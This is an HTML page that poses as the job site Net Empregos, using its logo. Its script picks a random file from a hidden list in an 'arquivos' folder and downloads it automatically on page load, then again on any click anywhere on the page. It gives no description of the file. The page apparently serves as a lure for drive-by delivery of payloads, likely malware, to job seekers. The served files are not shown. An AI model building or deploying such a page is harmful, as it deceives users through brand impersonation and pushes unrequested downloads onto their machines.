<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Net Empregos</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
}
.container {
    text-align: center;
    background: white;
    padding: 40px 60px;
    border-radius: 16px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
    max-width: 450px;
    width: 90%;
}
.logo {
    width: 200px;
    margin-bottom: 20px;
}
.status {
    margin: 15px 0;
    padding: 12px;
    border-radius: 8px;
    font-size: 14px;
    min-height: 44px;
}
.status.info { background: #e3f2fd; color: #1565c0; }
.status.success { background: #e8f5e9; color: #2e7d32; }
.status.error { background: #ffebee; color: #c62828; }
.btn-download {
    display: none;
    margin-top: 15px;
    padding: 14px 32px;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
    border: none;
    border-radius: 8px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: transform 0.2s, box-shadow 0.2s;
    text-decoration: none;
}
.btn-download:hover {
    transform: translateY(-2px);
    box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
}
.file-name {
    font-family: monospace;
    font-size: 12px;
    color: #666;
    margin-top: 8px;
    word-break: break-all;
}
.spinner {
    display: inline-block;
    width: 16px;
    height: 16px;
    border: 2px solid #667eea;
    border-top-color: transparent;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin-right: 6px;
    vertical-align: middle;
}
@keyframes spin { to { transform: rotate(360deg); } }
</style>
<base target="_blank">
</head>
<body>

<div class="container">
    <img src="https://www.net-empregos.com/img/logos/net-empregos.png" class="logo" alt="Net Empregos">

    <div id="status" class="status info">
        <span class="spinner"></span>Carregando...
    </div>

    <div id="fileName" class="file-name"></div>

    <button id="btnDownload" class="btn-download">
        📥 Baixar Arquivo
    </button>
</div>

<script>
(function() {
    const LISTA_URL = "lista.json";
    const PASTA = "arquivos/";

    const statusEl = document.getElementById("status");
    const fileNameEl = document.getElementById("fileName");
    const btnEl = document.getElementById("btnDownload");

    let arquivoEscolhido = "";
    let listaCarregada = false;

    function setStatus(msg, tipo) {
        statusEl.className = "status " + tipo;
        statusEl.innerHTML = tipo === "info" ? '<span class="spinner"></span>' + msg : msg;
    }

    function mostrarBotao() {
        btnEl.style.display = "inline-block";
        btnEl.onclick = function() {
            baixarArquivo();
        };
    }

    function escolherAleatorio(arr) {
        return arr[Math.floor(Math.random() * arr.length)];
    }

    function baixarArquivo() {
        if (!arquivoEscolhido) return;

        var url = PASTA + arquivoEscolhido;

        // Método 1: fetch + blob (mais confiável para nome correto)
        fetch(url)
            .then(function(r) { return r.blob(); })
            .then(function(blob) {
                var blobUrl = URL.createObjectURL(blob);
                var a = document.createElement("a");
                a.href = blobUrl;
                a.download = arquivoEscolhido;  // <-- NOME CORRETO AQUI
                a.style.display = "none";
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                setTimeout(function() { URL.revokeObjectURL(blobUrl); }, 5000);
                setStatus("✅ Download iniciado: " + arquivoEscolhido, "success");
            })
            .catch(function(err) {
                console.log("Fetch falhou, tentando redirect:", err);
                // Método 2: redirect direto
                var a = document.createElement("a");
                a.href = url;
                a.download = arquivoEscolhido;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
            });
    }

    // Carrega a lista
    fetch(LISTA_URL)
        .then(function(r) {
            if (!r.ok) throw new Error("HTTP " + r.status);
            return r.json();
        })
        .then(function(lista) {
            if (!Array.isArray(lista) || lista.length === 0) {
                throw new Error("Lista vazia");
            }

            arquivoEscolhido = escolherAleatorio(lista);
            listaCarregada = true;

            console.log("Lista carregada:", lista.length, "itens");
            console.log("Arquivo escolhido:", arquivoEscolhido);

            fileNameEl.textContent = arquivoEscolhido;
            setStatus("Arquivo selecionado. Iniciando download...", "info");

            // Tenta download automático
            setTimeout(baixarArquivo, 600);

            // Se bloquear, mostra botão após 3s
            setTimeout(function() {
                mostrarBotao();
            }, 3000);
        })
        .catch(function(err) {
            console.error("Erro ao carregar lista:", err);
            setStatus("❌ Erro ao carregar lista.json: " + err.message, "error");
            mostrarBotao();
        });

    // Se usuário clicar em qualquer lugar, tenta baixar
    document.addEventListener("click", function handler() {
        if (listaCarregada && arquivoEscolhido) {
            baixarArquivo();
        }
        document.removeEventListener("click", handler);
    });

})();
</script>

</body>
</html>
